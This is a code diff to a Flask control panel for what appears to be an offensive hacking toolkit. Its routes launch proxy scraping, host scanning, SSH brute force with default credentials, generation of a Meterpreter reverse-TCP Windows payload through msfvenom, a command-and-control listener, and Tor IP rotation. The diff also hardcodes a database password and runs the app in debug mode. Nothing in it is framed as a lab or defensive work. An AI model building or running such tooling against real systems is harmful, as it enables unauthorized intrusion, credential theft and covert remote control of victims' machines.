@@ -7,18 +7,19 @@ sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 from flask import Flask, render_template, redirect, url_for, request, flash, session, jsonify
 from database import db  # Ensure database connection works
 from globals import web_config, active_tasks, proxy_stats, host_stats, brute_stats
-from modules.proxy_handler import load_proxies, test_proxies, scrape_proxies
+from modules.proxy_handler import (
+    load_proxies, test_proxies, scrape_proxies, load_checked_proxies, save_working_proxies
+)
 from modules.host_handler import load_hosts, test_hosts
 from modules.bruteforce import bruteforce_ssh
 from modules.scanner import scan_hosts
 from modules.config_handler import configure_settings
-from flask import Flask, jsonify
-from modules.proxy_handler import (
-    scrape_proxies, load_proxies, test_proxies, load_checked_proxies, save_working_proxies
-)
+from modules.command_control import start_listener, stop_listeners
+from modules.shell_generator import generate_msfvenom_shell
+from modules.tor_handler import start_tor, renew_tor_ip, stop_tor
+
 from flask_sqlalchemy import SQLAlchemy
 from werkzeug.security import generate_password_hash, check_password_hash
-import os
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)  # Secret key for session encryption
@@ -27,9 +28,6 @@ app.secret_key = os.urandom(24)  # Secret key for session encryption
 app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://scanner_user:password@localhost/scanner_db'
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
-# WebApp Configuration
-app.config["SESSION_TYPE"] = "filesystem"
-app.config["DATABASE"] = "scanner_db"
 
 # User Model
 class User(db.Model):
@@ -58,29 +56,28 @@ def start_webapp():
     app.run(host=web_config["host"], port=web_config["port"], debug=True)
 
 # --- LOGIN & AUTHENTICATION ---
-@app.route("/", methods=["GET", "POST"])
+@app.route("/")
+def home():
+    if "user" not in session:
+        return redirect("/login")
+    return render_template("index.html")
+    
+@app.route("/login", methods=["GET", "POST"])
 def login():
-    """Login page."""
+    """Handles user authentication"""
     if request.method == "POST":
         username = request.form["username"]
         password = request.form["password"]
         user = User.query.filter_by(username=username).first()
 
         if user and user.check_password(password):
-            session["user"] = user.username
-            flash("Login successful!", "success")
+            session["user"] = username
             return redirect(url_for("dashboard"))
         else:
-            flash("Invalid credentials!", "danger")
-
+            flash("Invalid credentials", "error")
+    
     return render_template("login.html")
-@app.route("/dashboard")
-def dashboard():
-    """Main dashboard (protected)."""
-    if "user" not in session:
-        return redirect(url_for("login"))
 
-    return render_template("index.html")
 @app.route("/logout")
 def logout():
     """Logout and clear session."""
@@ -88,8 +85,17 @@ def logout():
     flash("Logged out successfully.", "info")
     return redirect(url_for("login"))    
 
+@app.route("/dashboard")
+def dashboard():
+    """Main dashboard (protected)."""
+    if "user" not in session:
+        return redirect(url_for("login"))
+
+    return render_template("index.html")
+
 @app.route("/stats")
 def stats():
+    """API for real-time statistics"""
     return jsonify({
         "proxies": proxy_stats,
         "hosts": host_stats,
@@ -97,6 +103,7 @@ def stats():
         "tasks": len(active_tasks)
     })   
 
+# --- PROXY MANAGEMENT ---
 @app.route("/proxies/scrape", methods=["POST"])
 def scrape_proxies_route():
     scrape_proxies()
@@ -117,6 +124,7 @@ def save_proxies_route():
     save_working_proxies()
     return jsonify({"message": "Valid Proxies Saved!"}), 200
 
+# --- HOST MANAGEMENT ---
 @app.route("/hosts/load", methods=["POST"])
 def load_hosts_route():
     load_hosts()
@@ -132,6 +140,7 @@ def scan_hosts_route():
     scan_hosts()
     return jsonify({"message": "Host Scanning Started!"}), 200
 
+# --- BRUTEFORCE ---
 @app.route("/bruteforce/start", methods=["POST"])
 def start_bruteforce_route():
     bruteforce_ssh(load_hosts(), ["admin"], ["password"])
@@ -141,11 +150,13 @@ def start_bruteforce_route():
 def stop_bruteforce_route():
     return jsonify({"message": "Brute-force Stopped!"}), 200
 
+# --- SHELL GENERATOR ---
 @app.route("/shell/generate", methods=["POST"])
 def generate_shell_route():
     generate_msfvenom_shell("windows/meterpreter/reverse_tcp", "127.0.0.1", "4444", "exe", "payload.exe")
     return jsonify({"message": "Payload Generated!"}), 200
 
+# --- COMMAND & CONTROL ---
 @app.route("/c2/start", methods=["POST"])
 def start_c2_route():
     start_listener()
@@ -156,6 +167,7 @@ def stop_c2_route():
     stop_listeners()
     return jsonify({"message": "C2 Server Stopped!"}), 200
 
+# --- TOR PROXY ---
 @app.route("/tor/start", methods=["POST"])
 def start_tor_route():
     start_tor()
